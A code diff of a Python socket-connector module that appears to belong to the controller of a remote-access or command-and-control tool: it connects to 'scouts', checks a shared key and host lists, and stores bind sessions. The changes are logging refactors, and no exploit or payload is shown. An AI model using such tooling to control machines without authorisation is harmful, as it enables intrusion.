@@ -1,14 +1,16 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.return_random_string as return_random_string
 import library.modules.config as config
 import library.modules.recv_all as recv_all
 import socket
 from datetime import datetime
+
 config.main()
 interface = config.interface
 if interface == "GUI":
     from flask import jsonify
+    import library.modules.log as log
 
 
 def main(args):
@@ -19,40 +21,45 @@ def main(args):
         s.settimeout(2)
         s.connect((host, port))
         if interface == "GUI":
-            config.app.logger.info("[library/modules/socket_connector] - Established a TCP connection to " + host + ":" + str(port))
+            log.log_normal("Established a TCP connection to " + host + ":" + str(port))
         elif interface == "CUI":
             print(config.pos + 'Established a TCP connection to ' + host + ':' + str(port))
         if config.white_list:
             if host not in config.white_list:
                 s.close()
                 if interface == "GUI":
-                    config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Connection aborted because " + str(host) + " is not in whitelist\x1b[0m")
-                    return jsonify({"output": "Fail", "output_message": "Connection was aborted because host was not in whitelist", "data": ""})
+                    log.log_error("Connection aborted because " + str(host) + " is not in whitelist")
+                    return jsonify(
+                        {"output": "Fail", "output_message": "Connection was aborted because host was not in whitelist",
+                         "data": ""})
                 elif interface == "CUI":
                     print(config.neg + 'Connection was aborted because host was not in whitelist')
-                return
+                    return
         elif config.black_list:
             if host in config.black_list:
                 s.close()
                 if interface == "GUI":
-                    config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Connection aborted because " + str(host) + " is in blacklist\x1b[0m")
-                    return jsonify({"output": "Fail", "output_message": "Connection was aborted because host was in blacklist", "data": ""})
+                    log.log_error("Connection aborted because " + str(host) + " is in blacklist")
+                    return jsonify(
+                        {"output": "Fail", "output_message": "Connection was aborted because host was in blacklist",
+                         "data": ""})
                 elif interface == "CUI":
                     print(config.neg + 'Connection was aborted because host was in blacklist')
-                return
-        s.settimeout(5)
+                    return
         try:
-            await_key = recv_all.main_recv(s)
+            await_key = recv_all.main(s, 5)
         except (socket.timeout, socket.error):
             if interface == "GUI":
-                config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Established connection to " + host + ":" + str(port) + " but no data received!\x1b[0m")
-                return jsonify({"output": "Fail", "output_message": "Established connection to " + host + ":" + str(port) + " but no data received!", "data": ""})
+                log.log_error("Established connection to " + host + ":" + str(port) + " but no data received!")
+                return jsonify({"output": "Fail", "output_message": "Established connection to " + host + ":" + str(
+                    port) + " but no data received!", "data": ""})
             elif interface == "CUI":
                 print(config.neg + 'Established connection to ' + host + ':' + str(port) + ' but no data received!')
+                return
         s.settimeout(None)
         if await_key == config.key:
             if interface == "GUI":
-                config.app.logger.info("[library/modules/socket_connector] - Key from scout matches, connection is allowed")
+                log.log_normal("Key from scout matches, connection is allowed")
             elif interface == "CUI":
                 print(config.pos + 'Key from scout matches, connection is allowed')
             config.scout_database[str(config.incremented_scout_id)] = [s, host, str(port),
@@ -62,12 +69,12 @@ def main(args):
                                                                            '%Y-%m-%d %H:%M:%S'),
                                                                        'Bind']
             if interface == "GUI":
-                config.app.logger.info("[library/modules/socket_connector] - Entry added to database")
+                log.log_normal("Entry added to database")
             elif interface == "CUI":
                 print(config.inf + 'Entry added to database')
 
+            config.incremented_scout_id += 1
             if interface == "GUI":
-                config.incremented_scout_id += 1
                 toReturn = {}
                 keys = list(config.scout_database.keys())
                 keys.sort()
@@ -78,20 +85,25 @@ def main(args):
                 return jsonify({"output": "Success", "output_message": "Connection established", "data": toReturn})
         else:
             if interface == "GUI":
-                config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Invalid key was supplied from scout, denying connection...\x1b[0m")
-                return jsonify({"output": "Fail", "output_message": "Invalid key was supplied from scout, denying connection...", "data": ""})
+                log.log_error("Invalid key was supplied from scout, denying connection...")
+                return jsonify(
+                    {"output": "Fail", "output_message": "Invalid key was supplied from scout, denying connection...",
+                     "data": ""})
             elif interface == "CUI":
                 print(config.neg + 'Invalid key was supplied from scout, denying connection...')
             s.close()
     except (socket.timeout, socket.error):
         if interface == "GUI":
-            config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Unable to establish bind TCP connection to " + host + ":" + str(port) + "\x1b[0m")
-            return jsonify({"output": "Fail", "output_message": "Unable to establish bind TCP connection to " + host + ":" + str(port), "data": ""})
+            log.log_error("Unable to establish bind TCP connection to " + host + ":" + str(port))
+            return jsonify({"output": "Fail",
+                            "output_message": "Unable to establish bind TCP connection to " + host + ":" + str(port),
+                            "data": ""})
         elif interface == "CUI":
             print(config.neg + 'Unable to establish bind TCP connection to ' + host + ':' + str(port))
     except (IndexError, ValueError):
         if interface == "GUI":
-            config.app.logger.error("\x1b[1m\x1b[31m[library/modules/socket_connector] - Please specify a valid hostname and port number\x1b[0m")
-            return jsonify({"output": "Fail", "output_message": "Please specify a valid hostname and port number", "data": ""})
+            log.log_error("Please specify a valid hostname and port number")
+            return jsonify(
+                {"output": "Fail", "output_message": "Please specify a valid hostname and port number", "data": ""})
         elif interface == "CUI":
             print(config.neg + 'Please specify a valid hostname and port number')
